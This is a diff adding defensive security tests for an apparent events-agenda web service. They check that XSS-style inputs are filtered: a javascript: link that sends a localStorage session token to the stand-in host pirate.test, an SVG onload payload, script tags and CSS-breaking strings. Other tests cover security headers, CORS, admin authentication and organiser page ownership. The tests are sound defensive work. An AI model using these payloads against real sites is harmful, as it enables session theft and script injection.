@@ -383,3 +383,66 @@ test("Le Truc de la semaine : au plus 48 requêtes sortantes par lot, une écrit
   const html = envoyes.map(x => x.htmlContent).join("");
   assert.ok(!html.includes("<img src=x"), "titre échappé"); assert.ok(html.includes("&lt;img") || !envoyes.length);
 });
+
+/* ---------- Sécurité (audit d'octobre 2026) ---------- */
+test("sécurité : liens « javascript: » et images non https refusés dans les propositions", async () => {
+  const e = env(), h = { "Content-Type": "application/json" };
+  const ev = { t: "Fête piégée", cat: "fete", s: "2099-06-01", w: "Moulins", z: "03", lat: 46.56, lon: 3.33,
+               u: "javascript:fetch('//pirate.test?'+localStorage.getItem('sbl-ses'))", b: " JaVaScRiPt:alert(1)", img: "http://pirate.test/x.png" };
+  assert.equal((await appel(e, "/propose", { headers: h, body: ev })).statut, 200);
+  assert.equal((await appel(e, "/propose", { headers: h, body: { type: "sources", url: "javascript:alert(1)" } })).statut, 400);
+  assert.equal((await appel(e, "/propose", { headers: h, body: { type: "sources", url: "Comité des fêtes de Cercy-la-Tour" } })).statut, 200);
+  const p = (await appel(e, "/admin/list", { headers: admin })).j.propositions[0];
+  assert.equal(p.u, ""); assert.equal(p.b, ""); assert.equal(p.img, "");
+});
+
+test("sécurité : l'éditeur ne publie jamais un objet brut (liens, type, champs inconnus filtrés)", async () => {
+  const e = env();
+  const piege = { t: "Concert", cat: "fete", s: "2099-06-01", w: "Moulins", z: "03", lat: 46.56, lon: 3.33, u: "javascript:alert(1)",
+                  b: "https://www.billetweb.fr/ok", img: "data:image/svg+xml,<svg onload=alert(1)>", script: "<script>alert(1)</script>", h: "20:00\"><b>" };
+  assert.equal((await appel(e, "/admin/publish", { headers: admin, body: { id: "p-test1", event: piege } })).statut, 200);
+  const a = (await appel(e, "/agenda")).j[0];
+  assert.equal(a.u, undefined); assert.equal(a.img, undefined); assert.equal(a.script, undefined); assert.equal(a.h, undefined);
+  assert.equal(a.b, "https://www.billetweb.fr/ok"); assert.equal(a.id, "p-test1");
+  const r = await appel(e, "/admin/publish", { headers: admin, body: { id: "p-test2", event: Object.assign({}, piege, { cat: "fete');}</style><script>" }) } });
+  assert.equal(r.statut, 400);
+});
+
+test("sécurité : en-têtes sur toutes les réponses, aucune page HTML du serveur n'exécute de script", async () => {
+  const e = env();
+  for (const chemin of ["/agenda", "/v1/sorties?dep=03", "/admin/list", "/inconnu"]) {
+    const r = await appel(e, chemin);
+    assert.equal(r.h.get("X-Content-Type-Options"), "nosniff", chemin);
+    assert.match(r.h.get("Content-Security-Policy") || "", /frame-ancestors 'none'/, chemin);
+    assert.ok(r.h.get("Strict-Transport-Security"), chemin);
+  }
+  const p = await appel(e, "/newsletter/stop?c=000000000000000000000000&s=00000000000000000000000000000000");
+  assert.match(p.h.get("Content-Type"), /text\/html/); assert.match(p.h.get("Content-Security-Policy"), /default-src 'none'/);
+});
+
+test("sécurité : un site inconnu n'obtient pas le CORS, l'espace éditeur exige le code", async () => {
+  const e = env();
+  const r = await appel(e, "/agenda", { headers: { Origin: "https://pirate.test" } });
+  assert.notEqual(r.h.get("Access-Control-Allow-Origin"), "https://pirate.test");
+  assert.notEqual(r.h.get("Access-Control-Allow-Origin"), "*");
+  for (const c of ["/admin/list", "/admin/cles", "/admin/orgs"]) assert.equal((await appel(e, c)).statut, 401, c);
+  assert.equal((await appel(e, "/compte")).statut, 401);
+  assert.equal((await appel(e, "/compte/export", { headers: { Authorization: "Bearer " + "a".repeat(64) } })).statut, 401);
+});
+
+test("sécurité : une page organisateur reprise par un autre compte n'est jamais modifiable par l'ancien", async () => {
+  const e = envC();
+  const a = await inscrire(e, "ancien@exemple.fr"), b = await inscrire(e, "nouveau@exemple.fr");
+  const ha = { Authorization: "Bearer " + a.session, "Content-Type": "application/json" }, hb = { Authorization: "Bearer " + b.session, "Content-Type": "application/json" };
+  const slug = (await appel(e, "/compte/org", { headers: ha, body: { nom: "Comité des fêtes" } })).j.compte.org.slug;
+  // la page passe à un autre compte (suppression par l'éditeur puis nouvelle création), l'ancien compte garde une copie périmée
+  const o = JSON.parse(e.DLC.m.get("org:" + slug)); o.id = JSON.parse(e.DLC.m.get("ses:" + await (await import(path.join(RACINE, "worker/comptes.js"))).empreinte(b.session))).id;
+  e.DLC.m.set("org:" + slug, JSON.stringify(o));
+  assert.equal((await appel(e, "/compte/org/logo", { headers: ha, body: { image: "data:image/png;base64,AAAA" } })).statut, 403);
+  const ev = { t: "Sortie usurpée", cat: "fete", s: "2099-06-01", w: "Moulins", z: "03", lat: 46.56, lon: 3.33 };
+  assert.equal((await appel(e, "/compte/sorties", { headers: ha, body: ev })).statut, 403);
+  const r = await appel(e, "/compte/org", { headers: ha, body: { nom: "Comité des fêtes" } });
+  assert.equal(r.statut, 200); assert.notEqual(r.j.compte.org.slug, slug);  // une nouvelle page, pas celle de l'autre
+  assert.equal(JSON.parse(e.DLC.m.get("org:" + slug)).id, o.id);
+  void hb;
+});
